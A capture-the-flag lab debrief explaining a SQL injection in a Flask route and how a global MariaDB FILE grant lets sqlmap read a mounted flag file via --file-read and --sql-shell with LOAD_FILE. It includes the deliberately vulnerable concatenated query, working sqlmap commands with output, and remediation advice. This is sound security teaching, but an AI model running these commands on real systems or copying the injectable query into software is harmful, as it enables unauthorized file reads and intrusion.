# The Groundskeeper's Keys, Debrief

**Node:** `p2_8` &middot; **Flag:** `SEIYAKU{file_privilege_has_no_walls}` &middot; **Route:** `GET /p2/keys` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (no table holds the flag; a mounted file does)

New to the shared `sqlmap` flags below (`-u`, `-p`, `--batch`,
`--ignore-stdin`, `--is-dba`)? They're explained in plain terms in A
Sealed Floor's and The Hall of Cells' debriefs. `--file-read`,
`--file-write`, and `--sql-shell`, all new here, are explained below.

## Root cause

The task-log lookup builds its query the same way every floor in this
lab does, raw string concatenation on a bare, unquoted numeric `id`:

```python
# challenges/phase2.py
q = f"SELECT id, task, note FROM garden_tasks WHERE id={task_id}"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

Same shape, same four techniques available, same sqlmap defaults find it
immediately. Nothing new there. What's different is what this floor's
database user is allowed to do once the injection is confirmed.

## Why this floor is different: an over-privileged account, not a hidden table

Every earlier MariaDB floor in this lab hid its flag in a table the
application's own legitimate query never touches, `keeper.secret`,
`vault_floors.secret`, `cell_records.secret`, and so on. This floor
doesn't. Look at `garden_tasks`, look at every other table in
`seiyaku_p2_keys` (there's only the one), there is nothing to find. The
flag was never in a row.

Instead, this floor's connecting user, `svc_p2_keys`, was granted
something none of the other floors' users have:

```sql
-- seed/mariadb/19_keys.sql
GRANT SELECT ON seiyaku_p2_keys.* TO 'svc_p2_keys'@'%';
GRANT FILE ON *.* TO 'svc_p2_keys'@'%';
```

`FILE` is a genuinely different kind of grant from everything else in
this lab. Every other `GRANT` here is scoped to one database
(`ON seiyaku_<challenge>.*`), which is exactly what makes this lab's
per-challenge isolation hold. `FILE` cannot be scoped that way at all,
MySQL and MariaDB only offer it as a *global* privilege
(`GRANT FILE ON *.*`), because it isn't about which database you can
query, it's about letting the SQL layer read and write the underlying
server's own filesystem via `LOAD_FILE()` and `... INTO OUTFILE`. A real
operator reaching for `FILE` because one feature (a CSV import, a backup
script, a report export) needs it hands that account something no
per-database `GRANT` can undo, regardless of how carefully every table
grant elsewhere is scoped.

## The technique: reading (and writing) files through the injection

**`--file-read=<path>`** asks sqlmap to fetch a specific file off the
back-end DBMS server's own filesystem, through the confirmed injection
point, using `LOAD_FILE()` under the hood (wrapped into whichever
technique is active, UNION here) and saving a local copy:

```
sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin \
    --file-read="/var/lib/mysql-files/groundskeeper.flag"
```

Real output from this exact seed:

```
[INFO] fetching file: '/var/lib/mysql-files/groundskeeper.flag'
do you want confirmation that the remote file '/var/lib/mysql-files/groundskeeper.flag' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[INFO] the local file '.../files/_var_lib_mysql-files_groundskeeper.flag' and the remote file '/var/lib/mysql-files/groundskeeper.flag' have the same size (37 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/localhost/files/_var_lib_mysql-files_groundskeeper.flag (same file)
```

The saved file's contents, verified live:

```
SEIYAKU{file_privilege_has_no_walls}
```

**`--sql-shell`** is a different way to reach the exact same thing: an
interactive prompt where every line you type is run as a query through
the confirmed injection point, and the result read back, no `--dump`,
no table/column narrowing, just a live SQL prompt riding the injection.
It's normally interactive, but piping a query in over stdin drives it
non-interactively too (this is exactly what `solvers/p2_8.sh` does):

```
echo "SELECT LOAD_FILE('/var/lib/mysql-files/groundskeeper.flag');" | \
    sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin --sql-shell
```

```
[INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> [INFO] fetching SQL SELECT statement query output: 'SELECT LOAD_FILE(...)'
SELECT LOAD_FILE('/var/lib/mysql-files/groundskeeper.flag'): 'SEIYAKU{file_privilege_has_no_walls}\n'
```

Same flag, same underlying privilege, a different way of asking for it,
useful whenever what you want isn't a clean table dump but a specific,
one-off query (`LOAD_FILE()`, `@@version`, whatever else the account can
see).

## `--file-write`, and why it fails here on purpose

**`--file-write=<local path>` / `--file-dest=<remote path>`** is the
write-side counterpart: push a local file onto the DBMS server's own
filesystem via `... INTO OUTFILE`. Tried against this exact seed:

```
sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin \
    --file-write=./probe.txt --file-dest=/var/lib/mysql-files/probe.txt
```

```
[WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
```

This isn't a bug in the floor, it's the point. `secure_file_priv` (set
explicitly for this container, see `docker-compose.yml`) confines
`LOAD_FILE`/`INTO OUTFILE` to one directory at the *SQL* level, but that
directory is also bind-mounted **read-only** from the host
(`./seed/mariadb-files:/var/lib/mysql-files:ro`), an independent
*operating-system* level restriction underneath it. The `GRANT FILE`
says "the SQL layer will allow this account to write here"; the
read-only mount says "the OS won't actually let MariaDB's own process
write here regardless." Both layers have to agree for a write to
succeed, and here only one does. `solvers/p2_8.sh` asserts this failure
explicitly, as a live check that this safety boundary hasn't quietly
regressed, not just a passing observation.

## A quick, honest recon check: FILE doesn't mean DBA

```
sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin --is-dba
```

```
current user is DBA: False
```

`svc_p2_keys` can read arbitrary files reachable by the MariaDB process
and query `information_schema`, but it holds no administrative
privileges, it cannot create users, alter other accounts' grants, or
touch the `mysql` system database. `FILE` is dangerous precisely because
it's easy to bundle into an account almost by accident (an import
feature, a reporting job) without anyone treating the grant as
administrative, and this floor's `--is-dba: False` result is the honest
proof that it isn't one, host-file exposure and full database
administration are two separate risks, and an account can carry the
first without the second.

## Why `--os-shell` isn't the next step here

sqlmap's `--os-shell` builds on file-write access to plant something it
can then execute: on MySQL/MariaDB (which has no built-in
`xp_cmdshell`-style stored procedure the way MS-SQL does), that means
writing a web-accessible script file via `INTO OUTFILE` into a directory
the *web server* also serves, then having sqlmap request that file over
HTTP to run commands through it. That path needs two things this lab
deliberately doesn't provide: a writable destination (already blocked
above, on purpose) and a filesystem location the Flask app itself would
actually execute or serve as code, which no route in this app does.
Rather than force a fragile, non-representative path just to tick the
flag off, this floor stops at `--file-read`/`--sql-shell` and explains
`--os-shell`'s real prerequisites here instead of faking them.

## HxH analogy

A groundskeeper's job has nothing to do with the tower's secrets, and
nobody hands out master keys expecting them to be used for anything but
hedges and hinges. But a key doesn't know what its holder's job title
is, it only knows which doors it opens. Give someone a key cut for
"anywhere on the grounds" because it was easier than cutting one for
"only the tool shed", and the day that person's ring of keys is lifted,
it was never really the tool shed that was at risk.

`FILE` is that master key. Nobody scoped it to "just this database"
because MySQL and MariaDB never gave anyone the option, it's all the
grounds or none of them. The account was never meant to be dangerous,
it just happened to be handed a key that doesn't know the difference
between a database and a hedge.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor:

  ```python
  cur.execute("SELECT id, task, note FROM garden_tasks WHERE id=%s", (task_id,))
  ```

  As always, this alone closes the injection point; nothing below matters
  if the query was never re-parseable as attacker-supplied SQL in the
  first place.
- **Never grant `FILE` to an application account unless something in
  that application genuinely requires filesystem access through SQL**,
  and if it does, isolate that account (and ideally that entire database
  connection) from every other application code path, exactly the
  opposite of what "just add FILE to the shared app role, it's simpler"
  does.
- **`secure_file_priv`, set to one directory, is necessary but not
  sufficient on its own.** It stops `LOAD_FILE`/`INTO OUTFILE` from
  reaching arbitrary paths, but an over-broad or writable directory is
  still a real path to code execution (via `--os-shell`-style webshell
  writes) if that directory happens to be reachable by anything that
  executes files. Pair it with OS-level permissions (a directory the
  DBMS process itself cannot write to unless a write is genuinely
  expected) as an independent second layer, exactly what stopped
  `--file-write` on this floor.
- **Least privilege, still the single highest-leverage fix in this
  entire lab.** Every other floor's flag was contained by scoping table
  grants to one database. This floor's flag exists specifically because
  one grant, `FILE`, cannot be scoped that way at all, which is the
  strongest argument in the whole lab for never granting it lightly.

## Isolation

This floor lives in its own database (`seiyaku_p2_keys`) and connects as
its own restricted user (`svc_p2_keys`). Its table-level access is scoped
exactly like every other challenge: verified live, `information_schema`
shows only this floor's own single table, and a cross-database read of
another challenge's table is denied (`ERROR 1142`). The one deliberate
exception in this whole lab is that `svc_p2_keys` additionally holds the
global `FILE` privilege, which cannot be scoped to one database by
design (see Root Cause above), granting host-file read access but,
verified live via `--is-dba: False`, nothing resembling administrative
control over the database server itself. `FILE` widens what this account
can reach on the *filesystem*; it does not widen which *tables* it can
read, that boundary held exactly as it does for every other floor.
